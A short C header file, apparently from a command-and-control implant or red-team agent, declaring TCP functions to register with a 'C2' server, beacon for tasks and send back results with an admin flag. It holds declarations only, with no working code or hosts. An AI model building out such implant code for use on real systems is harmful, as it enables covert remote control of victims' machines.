#pragma once
#include "transport.h"

// Register with C2 via TCP. Returns 1 on success.
int  transport_tcp_register(void);

// Poll for tasks via TCP. Returns heap-allocated array; *count set to number.
AgentTask* transport_tcp_beacon(int *count);

// Send result via TCP.
void transport_tcp_send_result(long long task_id, const char *output,
                               const char *error, int is_admin);
